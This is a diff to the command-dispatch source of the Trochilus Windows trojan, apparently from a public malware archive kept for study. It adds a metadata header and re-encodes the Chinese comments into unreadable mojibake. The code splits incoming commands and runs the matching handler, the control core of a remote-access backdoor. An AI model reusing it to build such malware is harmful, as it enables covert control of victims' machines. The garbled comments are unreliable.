@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include "Commands.h"
 #include "CommandManager.h"
@@ -49,7 +60,7 @@ void CommandManager::Deinit()
 
 BOOL CommandManager::Execute( LPCTSTR cmdline, tstring& replyText )
 {
-	//·Ö¸î²¢ÕûÀíÃüÁîÐÐµÄ¸÷¸ö²¿·Ö
+	//ï¿½Ö¸î²¢ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ÐµÄ¸ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 	TStringVector parts;
 	splitByChar(cmdline, parts, ' ');
 
@@ -68,14 +79,14 @@ BOOL CommandManager::Execute( LPCTSTR cmdline, tstring& replyText )
 		}
 	}
 
-	//¼ì²éÊÇ·ñÓÐ¿ÉÓÃµÄ²¿·Ö
+	//ï¿½ï¿½ï¿½ï¿½Ç·ï¿½ï¿½Ð¿ï¿½ï¿½ÃµÄ²ï¿½ï¿½ï¿½
 	if (parts.size() == 0)
 	{
 		replyText = _T("invalid command.");
 		return FALSE;
 	}
 
-	//²éÕÒ¿ÉÓÃµÄÃüÁî
+	//ï¿½ï¿½ï¿½Ò¿ï¿½ï¿½Ãµï¿½ï¿½ï¿½ï¿½ï¿½
 	tstring& cmdname = parts[0];
 	makeLower(cmdname);
 
@@ -86,7 +97,7 @@ BOOL CommandManager::Execute( LPCTSTR cmdline, tstring& replyText )
 		return FALSE;
 	}
 
-	//Ö´ÐÐÃüÁî
+	//Ö´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 	ICmd* pCmd = cmdIter->second;
 	BOOL bExecuteOK = pCmd->Execute(parts, replyText, m_env);
 
